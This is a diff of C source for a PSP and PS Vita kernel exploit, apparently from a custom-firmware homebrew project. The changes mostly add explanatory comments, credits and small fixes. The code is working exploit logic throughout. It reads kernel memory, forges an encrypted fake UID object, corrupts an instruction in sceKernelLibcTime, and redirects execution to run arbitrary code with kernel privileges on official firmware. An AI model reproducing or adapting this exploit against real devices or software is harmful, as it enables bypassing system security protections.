@@ -1,3 +1,12 @@
+/*
+SceUID kernel exploit and read-only exploit by qwikrazor87.
+Inspired by part of the Trinity exploit chain by thefl0w.
+Put together by Acid_Snake, meetpatty, CelesteBlue and krazynez.
+
+Made to work on OFW and CFW.
+
+*/
+
 #include <pspdebug.h>
 #include <pspctrl.h>
 #include <pspsdk.h>
@@ -18,20 +27,11 @@
 
 #include "common/utils/scanner.c"
 
-/*
-SceUID kernel exploit and read-only exploit by qwikrazor87.
-Part of Trinity exploit chain by thefl0w.
-Put together by Acid_Snake and meetpatty.
-*/
-
 #define LIBC_CLOCK_OFFSET_660  0x88014400
 #define LIBC_CLOCK_OFFSET_360  0x88014D80
 #define LIBC_CLOCK_OFFSET_365  0x88014D00
 #define SYSMEM_SEED_OFFSET_365 0x88014E38
 #define SYSMEM_SEED_OFFSET_CHECK SYSMEM_TEXT+0x00002FA8
-
-//#define TYPE_UID_OFFSET_660 0x880164c0
-//#define TYPE_UID_OFFSET_360 0x88016dc0
 
 #define FAKE_UID_OFFSET        0x80
 
@@ -101,13 +101,14 @@ u32 readKram(u32 addr) {
 	return res;
 }
 
+// on CFW, we can setup a custom function to handle module loading, this function executes with kernel priviledges
 void my_mod_handler(void* mod){
 
-    // corrupt kernel
+    // corrupt kernel, simulates typical NOP in sceKernelLibcTime so we can pass a second argument
     u32 libctime = (void*)FindFunction("sceSystemMemoryManager", "UtilsForUser", 0x27CC57F0);
     patch_addr = libctime + 4;
     patch_instr = _lw(patch_addr);
-    _sw(0, patch_addr);
+    _sw(NOP, patch_addr);
 
     // fallback to previous handler
     if (prev){
@@ -116,24 +117,26 @@ void my_mod_handler(void* mod){
     set_start_module_handler(prev);
 }
 
+// restore corrupted kernel memory
 void repairInstruction(KernelFunctions* k_tbl) {
   if (patch_addr && patch_instr){
-      // restore
       _sw(patch_instr, patch_addr);
   }
 }
 
+// find needed functions
 int stubScanner(UserFunctions* tbl){
     int res = 0;
     g_tbl = tbl;
-    tbl->freeMem(tbl);
 
+    // load some common modules
     g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
     g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
     g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
 	  _sceNetMCopyback_1560F143 = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);
 
-    set_start_module_handler = tbl->FindImportUserRam("SystemCtrlForUser", 0x1C90BECB); // weak import in ARK Live
+    // weak import in ARK Loader, we later check if it's actually available
+    set_start_module_handler = tbl->FindImportUserRam("SystemCtrlForUser", 0x1C90BECB);
     _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);
 
     return (_sceNetMCopyback_1560F143==NULL);
@@ -142,55 +145,63 @@ int stubScanner(UserFunctions* tbl){
 /*
 FakeUID kxploit
 */
-
 int doExploit(void) {
 
     int res;
     u32 seed = 0;
     prev = NULL;
+    patch_addr = 0;
+    patch_instr = 0;
 
+    // CFW check
     if (set_start_module_handler){
+      // check if the sctrlHENSetStartModuleHandler (CFW-only) import has been properly linked
       u16 start_module_syscall = _lh((u32)set_start_module_handler+6);
       if (start_module_syscall && start_module_syscall != 0x2402){
         PRTSTR("CFW detected");
         prev = set_start_module_handler(my_mod_handler); // register our custom handler
         g_tbl->UtilityLoadModule(PSP_MODULE_NP_DRM); // trigger StartModule handler
-        g_tbl->UtilityUnloadModule(PSP_MODULE_NP_DRM);
+        g_tbl->UtilityUnloadModule(PSP_MODULE_NP_DRM); // not really needed but whatever
         return (patch_addr == 0 || patch_instr == 0);
       }
     }
+    // OFW then
     if (_sceNetMCopyback_1560F143 != NULL){
+      // not the most robust, but it works
       u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
       if (test_val == 0x8F154E38){
-        seed = readKram(SYSMEM_SEED_OFFSET_365);
-        libc_clock_offset = LIBC_CLOCK_OFFSET_365;
+        // 3.65+ requires the fake UID object to UID encrypted with random seed
+        seed = readKram(SYSMEM_SEED_OFFSET_365); // we need to read this seed so we can plant fake UID object
+        libc_clock_offset = LIBC_CLOCK_OFFSET_365; // adjust offset
         PRTSTR("Vita 3.65+");
       }
       else if (test_val == 0x8FBF003C){
-        libc_clock_offset = LIBC_CLOCK_OFFSET_660;
+        libc_clock_offset = LIBC_CLOCK_OFFSET_660; // adjust offset
         PRTSTR("PSP 6.60+");
       }
       else {
         PRTSTR("Vita 3.60");
-        libc_clock_offset = LIBC_CLOCK_OFFSET_360;
+        libc_clock_offset = LIBC_CLOCK_OFFSET_360; // adjust offset
       }
     }
 
-    // Allocate dummy block to improve reliability
+    // Allocate dummy blocks to improve reliability
     char dummy[32];
     memset(dummy, 'a', sizeof(dummy));
     SceUID dummyid;
-    for (int i=0; i<10; i++)
+    for (int i=0; i<10; i++) // a few iterations seem to improve stability
       dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);
 
+    // we can use whatever memory allocated by dummy block to inject some code, thus not needing to rely on hardcoded pointers
     jump_ptr = g_tbl->KernelGetBlockHeadAddr(dummyid) + 4;
 
     // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
     u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
     u32 newaddr = dummyaddr - FAKE_UID_OFFSET;
     SceUID uid = (((newaddr & 0x00ffffff) >> 2) << 7) | 0x1;
-    SceUID encrypted_uid = uid ^ seed; // encrypt UID, if there's none then A^0=A
+    SceUID encrypted_uid = uid ^ seed; // encrypt UID with seed, if there's none then A^0=A
 
+    // grab some data from dummy UID block to implant into our fake UID block, this removes some hardcoding and improves reliability
     u32 type_uid = readKram(dummyaddr+8);
     u32 uid_name = readKram(dummyaddr+16);
 
@@ -200,9 +211,11 @@ int doExploit(void) {
 
     g_tbl->KernelDcacheWritebackAll();
 
+    // check that the fake UID block has been planted where we expect
     u32 test = readKram(newaddr+8);
     if (test != type_uid) return -1;
 
+    // backup data so we can restore later
     patch_addr = libc_clock_offset;
     patch_instr = readKram(libc_clock_offset);
 
@@ -217,10 +230,11 @@ int doExploit(void) {
 }
 
 void executeKernel(u32 kernelContentFunction){
-  if (prev){
+  if (prev){ // CFW
+    // can pass second argument to sceKernelLibcTime
     _sceKernelLibcTime(0x08800000, KERNELIFY(kernelContentFunction));
   }
-  else {
+  else { // OFW
     // Make a jump to kernel function
     _sw(JUMP(KERNELIFY(kernelContentFunction)), jump_ptr);
     _sw(NOP, jump_ptr+4);
